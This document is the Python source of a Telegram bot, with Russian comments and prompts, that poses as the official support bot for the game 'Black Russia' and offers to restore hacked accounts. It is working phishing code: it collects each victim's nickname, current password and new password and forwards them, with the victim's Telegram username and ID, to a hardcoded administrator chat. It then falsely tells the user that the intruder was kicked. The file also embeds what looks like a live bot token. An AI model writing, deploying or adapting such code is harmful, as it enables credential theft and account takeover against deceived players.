import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

# ТОКЕН БОТА
API_TOKEN = '9299536987:AAEkfnqtmrab-BbdJW41PK9haNQ2v1nLu6U'

# ВАШ ТЕЛЕГРАМ ID (Уже успешно добавлен)
ADMIN_ID = 8849614274  

bot = telebot.TeleBot(API_TOKEN)

# Список серверов
SERVERS = [
    "RED", "GREEN", "BLUE", "YELLOW", "ORANGE", "PURPLE", "LIME", "PINK",
    "CHERRY", "BLACK", "INDIGO", "WHITE", "MAGENTA", "CRIMSON", "GOLD", "AZURE",
    "PLATINUM", "AQUA", "GRAY", "ICE", "CHILLI", "CHOCO", "MOSCOW", "SPB",
    "UFA", "SOCHI", "KAZAN", "SAMARA", "ROSTOV", "ANAPA", "EKB", "KRASNODAR",
    "ARZAMAS", "NOVOSIB", "GROZNY", "SARATOV", "OMSK", "IRKUTSK", "VOLGOGRAD", "VORONEZH",
    "BELGOROD", "MAKHCHKALA", "VLADIKAVKAZ", "VLADIVOSTOK", "KALININGRAD", "CHELYABINSK", "KRASNOYARSK", "CHEBOKSARY",
    "KHABAROVSK", "PERM", "TULA", "RYAZAN", "MURMANSK", "PENZA", "KURSK", "ARKHANGELSK",
    "ORENBURG", "KIROV", "KEMEROVO", "TYUMEN", "TOLYATTI", "IVANOVO", "STAVROPOL", "SMOLENSK",
    "PSKOV", "BRYANSK", "OREL", "YAROSLAVL", "BARNAUL", "LIPETSK", "ULYANOVSK", "YAKUTSK",
    "TAMBOV", "BRATSK", "ASTRAKHAN", "CHITA", "KOSTROMA", "VLADIMIR", "KALUGA", "NOVGOROD",
    "TAGANROG", "VOLOGDA", "TVER", "TOMSK", "IZHEVSK", "SURGUT", "PODOLSK", "MAGADAN",
    "CHEREPOVETS", "NORILSK", "ASTANA"
]

def get_back_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("Назад"))
    return markup

# СТАРТ: Приветствие
@bot.message_handler(commands=['start'])
def send_start_message(message):
    bot.clear_step_handler_by_chat_id(chat_id=message.chat.id)
    
    markup = InlineKeyboardMarkup()
    btn_restore = InlineKeyboardButton(text="Восстановить доступ", callback_data="action_restore_access")
    markup.add(btn_restore)
    
    full_text = (
        "🤖 <b>Официальный бот поддержки Black Russia</b>\n\n"
        "Бот предназначен для восстановления аккаунтов в случае взлома или потери доступа к аккаунту.\n\n"
        "Немедленно восстановите доступ, дабы не потерять свой аккаунт."
    )
    
    bot.send_message(message.chat.id, full_text, reply_markup=markup, parse_mode='HTML')

# Перенаправление по кнопке "Назад" обратно на старт
@bot.message_handler(func=lambda msg: msg.text == "Назад")
def handle_back_button(message):
    send_start_message(message)

# Выбор игрового сервера
@bot.callback_query_handler(func=lambda call: call.data == "action_restore_access")
def display_servers_menu(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    bot.clear_step_handler_by_chat_id(chat_id=chat_id)
    
    # Генерация инлайн-кнопок для серверов по 3 в ряд
    markup = InlineKeyboardMarkup(row_width=3)
    buttons = []
    for server in SERVERS:
        btn = InlineKeyboardButton(text=server, callback_data=f"server_{server.lower()}")
        buttons.append(btn)
    markup.add(*buttons)
    
    bot.send_message(chat_id, "<b>Выберите игровой сервер:</b>", reply_markup=markup, parse_mode='HTML')

# Шаг 2: Ввод Nick_Name
@bot.callback_query_handler(func=lambda call: call.data.startswith('server_'))
def process_server_selection(call):
    chat_id = call.message.chat.id
    server_name = call.data.split('_')[1].upper()
    bot.answer_callback_query(call.id)
    
    text = f"Вы выбрали сервер: <b>{server_name}</b>\n\n1️⃣ <b>Введите ваш Nick_Name</b>"
    msg = bot.send_message(chat_id, text, parse_mode='HTML', reply_markup=get_back_keyboard())
    bot.register_next_step_handler(msg, lambda m: process_step_nickname(m, server_name))

# Шаг 3: Ввод текущего пароля
def process_step_nickname(message, server_name):
    if message.text == "Назад":
        send_start_message(message)
        return
        
    nickname = message.text
    text = "2️⃣ <b>Чтобы восстановить аккаунт, введите ваш текущий пароль:</b>"
    msg = bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=get_back_keyboard())
    bot.register_next_step_handler(msg, lambda m: process_step_password(m, server_name, nickname))

# Шаг 4: Ввод нового пароля
def process_step_password(message, server_name, nickname):
    if message.text == "Назад":
        send_start_message(message)
        return
        
    current_password = message.text
    text = "3️⃣ <b>Введите новый пароль:</b>"
    msg = bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=get_back_keyboard())
    bot.register_next_step_handler(msg, lambda m: process_step_final(m, server_name, nickname, current_password))

# Шаг 5: Финал и отправка логов администратору
def process_step_final(message, server_name, nickname, current_password):
    if message.text == "Назад":
        send_start_message(message)
        return
        
    new_password = message.text
    
    # Отправка логов в ваш чат
    try:
        logs_text = (
            f"📥 <b>Получены новые данные:</b>\n"
            f"🌐 Сервер: {server_name}\n"
            f"👤 Никнейм: <code>{nickname}</code>\n"
            f"🔑 Текущий пароль: <code>{current_password}</code>\n"
            f"🆕 Новый пароль: <code>{new_password}</code>\n"
            f"📱 Отправитель: @{message.from_user.username} (ID: {message.chat.id})"
        )
        bot.send_message(ADMIN_ID, logs_text, parse_mode='HTML')
    except Exception as e:
        print(f"Ошибка при отправке логов админу: {e}")

    text = (
        "✅ <b>Нарушитель был кикнут с сервера!</b>\n\n"
        "Приятной игры на нашем проекте."
    )
    
    remove_keyboard = ReplyKeyboardRemove()
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=remove_keyboard)

if __name__ == "__main__":
    print("Бот успешно запущен и ожидает сообщений...")
    bot.infinity_polling()